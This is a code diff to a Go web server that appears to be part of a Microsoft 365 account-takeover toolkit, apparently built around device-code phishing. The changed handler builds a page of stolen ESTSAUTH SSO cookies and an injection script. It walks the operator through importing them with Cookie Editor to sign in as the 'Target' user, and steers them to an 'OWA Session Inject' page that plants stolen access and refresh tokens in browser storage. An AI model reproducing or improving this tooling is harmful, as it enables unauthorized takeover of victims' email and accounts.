@@ -1550,12 +1550,32 @@ func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request)
 	scriptBuf.WriteString("}();")
 	script := scriptBuf.String()
 
-	found := len(entries) > 0
+	// Check if we got the key ESTSAUTH cookies — server-side refresh usually only yields
+	// fpc/esctx/buid. ESTSAUTH requires an interactive browser session with Microsoft's
+	// SSTS challenge, which a server-side HTTP client can never satisfy.
+	hasESTS := false
+	for _, e := range entries {
+		if e.Name == "ESTSAUTH" || e.Name == "ESTSAUTHPERSISTENT" {
+			hasESTS = true
+			break
+		}
+	}
+
+	// statusNote shown at top of page
 	statusNote := ""
-	if !found {
-		statusNote = `<div style="background:#3a1a1a;border:1px solid #7a2a2a;border-radius:4px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:#e07070">
-No ESTS cookies were obtained. Microsoft may not have set them for this token type.<br>
-The snippet below will run but the cookie list will be empty — try the <strong>Inject Browser Session</strong> approach instead.
+	if !hasESTS {
+		// No ESTSAUTH obtained — redirect user to the OWA inject page which DOES work.
+		statusNote = fmt.Sprintf(`<div style="background:#1a2a0a;border:2px solid #3a7a1a;border-radius:6px;padding:16px 20px;margin-bottom:16px">
+<div style="font-size:14px;font-weight:700;color:#7fcc40;margin-bottom:8px">Use OWA Session Inject instead — it always works</div>
+<p style="font-size:13px;color:#aad480;line-height:1.7;margin-bottom:12px">
+ESTSAUTH was <strong style="color:#fff">not obtained</strong> — Microsoft only sets that cookie during an interactive browser login, never from a server-side token refresh. The console script below cannot set HttpOnly cookies either, so it <strong style="color:#fff">will not log you in</strong>.<br><br>
+<strong style="color:#fff">The reliable method:</strong> use <strong>OWA Session Inject</strong> which writes the MSAL token cache (access + refresh token) directly into the browser localStorage — no cookies needed.
+</p>
+<a href="/dc/inject/%s" style="display:inline-block;padding:10px 24px;background:#107c10;color:#fff;border-radius:4px;font-size:13px;font-weight:700;text-decoration:none">→ Go to OWA Session Inject</a>
+</div>`, template.HTMLEscapeString(landingToken))
+	} else {
+		statusNote = `<div style="background:#0a1a2a;border:1px solid #1a4a7a;border-radius:4px;padding:10px 14px;margin-bottom:14px;font-size:13px;color:#7ec8e3">
+<strong style="color:#fff">ESTSAUTH obtained</strong> — use <strong>Cookie Editor</strong> (Method A below) to inject. The console script (Method B) CANNOT set HttpOnly cookies and will not work.
 </div>`
 	}
 
@@ -1570,10 +1590,6 @@ h1{font-size:18px;color:#fff;margin-bottom:4px}
 .sub{font-size:12px;color:#666;margin-bottom:20px}
 .card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:18px 22px;margin-bottom:16px}
 h2{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#555;margin-bottom:12px}
-.steps{list-style:none;counter-reset:s}
-.steps li{counter-increment:s;padding:10px 0 10px 38px;position:relative;font-size:13px;color:#bbb;border-bottom:1px solid #1c1c1c}
-.steps li:last-child{border-bottom:none}
-.steps li::before{content:counter(s);position:absolute;left:0;top:10px;background:#0078d4;color:#fff;width:24px;height:24px;border-radius:50%%;font-size:11px;font-weight:700;text-align:center;line-height:24px}
 .steps a{color:#0078d4}.steps strong{color:#fff}
 textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c;border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:11px;color:#7ec8e3;white-space:pre;height:120px;resize:none;outline:none;cursor:text}
 .row{display:flex;gap:8px;align-items:center;margin-top:10px;flex-wrap:wrap}
@@ -1583,44 +1599,43 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 .back{color:#666;font-size:12px;text-decoration:none;display:block;margin-bottom:16px}
 .note{font-size:11px;color:#555;margin-top:8px}
 .badge{display:inline-block;background:#107c10;color:#fff;font-size:10px;padding:2px 8px;border-radius:3px;margin-left:6px;vertical-align:middle}
+.dead{background:#2a2a2a;color:#555;cursor:not-allowed}
 </style></head><body>
 <a class="back" href="/dc/use/%s">&larr; Dashboard</a>
 <h1>ESTS Login Cookies <span class="badge">%d cookies</span></h1>
-<p class="sub">Inject Microsoft SSO session cookies into your browser</p>
+<p class="sub">Microsoft SSO cookies obtained via server-side token refresh</p>
 %s
 <div class="card" style="border-color:#1a3a5c">
-<h2 style="color:#4a9fd4">Two ways to inject — use Cookie Editor (recommended)</h2>
+<h2 style="color:#4a9fd4">How to use (only when ESTSAUTH was obtained)</h2>
 <p style="font-size:13px;color:#bbb;margin-bottom:14px">
-  <strong style="color:#fff">Method A — Cookie Editor extension</strong> (best, sets HttpOnly cookies correctly):<br>
+  <strong style="color:#fff">Cookie Editor extension</strong> — the ONLY way to set HttpOnly cookies from the browser:<br>
   &nbsp;1. Install <strong>Cookie Editor</strong> from Chrome/Firefox extension store<br>
   &nbsp;2. Open <a href="https://login.microsoftonline.com" target="_blank" style="color:#0078d4">login.microsoftonline.com</a><br>
-  &nbsp;3. Click Cookie Editor icon → <strong>Import</strong> tab → paste the Cookie Editor JSON below → click <strong>Import</strong><br>
+  &nbsp;3. Click Cookie Editor icon → <strong>Import</strong> tab → paste the JSON below → <strong>Import</strong><br>
   &nbsp;4. Refresh the page → signed in as <strong>%s</strong>
 </p>
-<p style="font-size:13px;color:#bbb">
-  <strong style="color:#fff">Method B — Console script</strong> (sets cookies without HttpOnly flag, may not always work):<br>
-  &nbsp;1. Open <a href="https://login.microsoftonline.com" target="_blank" style="color:#0078d4">login.microsoftonline.com</a> → F12 → Console<br>
-  &nbsp;2. Copy Script below → paste → Enter
+<p style="font-size:13px;color:#666;line-height:1.6">
+  <strong style="color:#555">Console script (Method B) — does NOT work</strong><br>
+  JavaScript's <code style="color:#888">document.cookie</code> cannot set <code style="color:#888">HttpOnly</code> cookies. ESTSAUTH requires HttpOnly to be recognised by Microsoft. Pasting this script will set non-HttpOnly cookies that Microsoft will ignore.
 </p>
 </div>
 <div class="card">
-<h2>Injection Script</h2>
-<textarea class="code" id="ta" readonly>%s</textarea>
-<div class="row">
-<button class="btn" onclick="doCopy()">Copy Script</button>
-<a class="btn b2" href="https://login.microsoftonline.com" target="_blank" onclick="doCopy()">Copy &amp; Open Login</a>
-<span class="ok" id="ok">Copied!</span>
-</div>
-<p class="note">If copy fails: click inside the box, press Ctrl+A then Ctrl+C</p>
-</div>
-<div class="card">
-<h2>Cookie Editor JSON <span style="font-size:10px;color:#555;text-transform:none;letter-spacing:0">(import via Cookie Editor browser extension)</span></h2>
+<h2>Cookie Editor JSON</h2>
 <textarea class="code" id="tej" readonly style="height:160px">%s</textarea>
 <div class="row">
 <button class="btn" onclick="doCopyJson()">Copy for Cookie Editor</button>
 <span class="ok" id="okj">Copied!</span>
 </div>
-<p class="note">Install the <strong>Cookie Editor</strong> extension → open it on login.microsoftonline.com → Import tab → paste JSON</p>
+<p class="note">Cookie Editor extension → open on login.microsoftonline.com → Import tab → paste JSON → Import → refresh</p>
+</div>
+<div class="card">
+<h2>Console Script <span style="font-size:10px;color:#555;text-transform:none;letter-spacing:0">(non-HttpOnly only — usually ineffective for ESTSAUTH)</span></h2>
+<textarea class="code dead" id="ta" readonly>%s</textarea>
+<div class="row">
+<button class="btn b2" onclick="doCopy()">Copy Script</button>
+<span class="ok" id="ok">Copied!</span>
+</div>
+<p class="note" style="color:#7a2a2a">This script CANNOT set HttpOnly cookies. Do not expect it to work for ESTSAUTH.</p>
 </div>
 <div class="card" style="font-size:12px;color:#555;line-height:1.9">
   <div>Target: <span style="color:#888">%s</span></div>
@@ -1653,9 +1668,7 @@ function legacyCopyJson(){
 }
 function showOkJson(){var o=document.getElementById('okj');o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
 ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
-ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
 tej.addEventListener('click',function(){tej.select();tej.setSelectionRange(0,99999);});
-tej.addEventListener('focus',function(){tej.select();tej.setSelectionRange(0,99999);});
 </script>
 </body></html>`,
 		template.HTMLEscapeString(email),
@@ -1663,8 +1676,8 @@ tej.addEventListener('focus',function(){tej.select();tej.setSelectionRange(0,999
 		len(entries),
 		statusNote,
 		template.HTMLEscapeString(email),
-		template.HTMLEscapeString(script),
 		template.HTMLEscapeString(string(cookieEditorJSON)),
+		template.HTMLEscapeString(script),
 		template.HTMLEscapeString(email),
 		template.HTMLEscapeString(tenant),
 		len(entries),
